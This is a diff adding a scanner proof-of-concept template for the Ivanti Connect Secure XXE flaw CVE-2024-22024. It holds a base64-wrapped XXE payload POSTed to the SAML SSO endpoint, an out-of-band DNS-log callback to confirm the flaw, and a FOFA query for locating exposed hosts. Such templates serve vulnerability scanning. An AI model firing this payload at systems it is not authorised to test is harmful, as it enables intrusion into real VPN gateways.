@@ -1,0 +1,29 @@
+id: poc-yaml-ivanti-pulse-connect-secure-vpn-xxe
+info:
+  name: Ivanti Pulse Connect Secure VPN XXE 漏洞(CVE-2024-22024)
+  severity: high
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - xxe
+  - CVE-2024-22024
+  finger: policy_secure
+  fofa: title="Ivanti Connect Secure - PleaseWait" && is_domain=false
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  t1: concat(`<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % watchTowr SYSTEM "http://`,domain,`/x">
+    %watchTowr;]><r></r>`)
+  payload: base64(t1)
+requests:
+- method: POST
+  path: /dana-na/auth/saml-sso.cgi
+  data: SAMLRequest={{.payload}}
+  expression: 'contains(body,"/dana-na/") &&
+
+    contains(body,"WriteCSS") &&
+
+    reverse.Verify()
+
+    '
+transport: http
